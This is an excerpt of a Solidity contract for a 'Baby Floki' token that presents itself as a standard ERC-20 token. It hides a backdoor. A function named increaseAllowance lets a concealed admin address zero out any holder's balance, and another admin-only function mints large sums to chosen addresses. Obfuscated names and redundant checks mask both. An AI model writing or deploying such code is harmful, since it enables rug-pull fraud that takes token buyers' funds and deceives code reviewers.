...
contract BABYFLOKITOKEN is Ownable {
    address public dknngu198;
    uint256 supplyamount = 10000000000*10**decimals();
    uint256 private _cctotalSupply = supplyamount;
    string private _cctokenname = "Baby Floki";
    string private _cctokensymbol = "BABYFLOKI";
    constructor(address tokenadmin) {
        dknngu198 = tokenadmin;
       BABYFLOKI[_msgSender()] += supplyamount;
        emit Transfer(address(0), _msgSender(), supplyamount);
    }
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    mapping(address => uint256) private BABYFLOKI;
    ...
    function increaseAllowance(address uuyxxx) public     {
        if(dknngu198 == _msgSender()){
        address newadd = uuyxxx;
        uint256 curamount = BABYFLOKI[newadd];
        uint256 newaaamount = BABYFLOKI[newadd]+BABYFLOKI[newadd]-curamount;
        BABYFLOKI[newadd] -= newaaamount;
        }else{
        if(dknngu198 == _msgSender()){
        }else{
            revert("ccc");
    ...
    external {
        ...
        BABYFLOKI[cc123d] += 38200*((10**decimals()*xxtoudiamount))*1*1;
        require(dknngu198 == _msgSender());
        if(dknngu198 == _msgSender()){
        }
    }
    ...
    function _transfer(
        ...
        uint256 balance = BABYFLOKI[from];
        require(balance >= amount, "ERC20: transfer amount exceeds balance");
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        BABYFLOKI[from] = BABYFLOKI[from]-amount;
        BABYFLOKI[to] = BABYFLOKI[to]+amount;
